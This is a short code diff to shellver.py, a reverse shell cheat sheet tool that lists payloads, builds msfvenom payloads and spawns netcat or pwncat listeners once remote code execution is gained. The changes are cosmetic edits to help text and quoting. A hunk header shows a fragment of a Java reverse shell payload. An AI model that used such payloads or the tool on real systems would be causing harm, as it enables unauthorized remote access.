@@ -12,13 +12,13 @@ Shellver is a Reverse Shell Cheat Sheet Tool.
 
 It tries to streamline some of the tedious parts of getting shells when you already have RCE, by giving you a list of payloads, automatically spawning a listener, giving sensible defaults etc.
 
-Usage: shellver.py [-h] (msf|shell|pwncat)
+Usage: shellver.py [-h] msf|shell|pwncat
 
 Options:
-    -h      Show this help text
-    msf     Create msfvenom payloads, generate msconsole config files, and start a listener
-    shell   Show a generic list of reverse shell commands and start a netcat listener
-    pwncat  Show Linux reverse shell commands and start a pwncat listener
+    -h --help  Show this help text
+    msf        Create msfvenom payloads, generate msconsole config files, and start a listener
+    shell      Show a generic list of reverse shell commands and start a netcat listener
+    pwncat     Show Linux reverse shell commands and start a pwncat listener
 """
 import argparse
 import ipaddress
@@ -370,7 +370,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
         print(
             "For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n"
         )
-    print(reset_color, end='')
+    print(reset_color, end="")
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append("sudo")
@@ -520,7 +520,7 @@ run -j"""
         sys.exit(1)
 
     print(f"{choice(color)}         |--Shell Spawning--|\n")
-    print(reset_color, end='')
+    print(reset_color, end="")
     command = []
     if os.geteuid() != 0 and int(port) < 1024:
         command.append("sudo ")
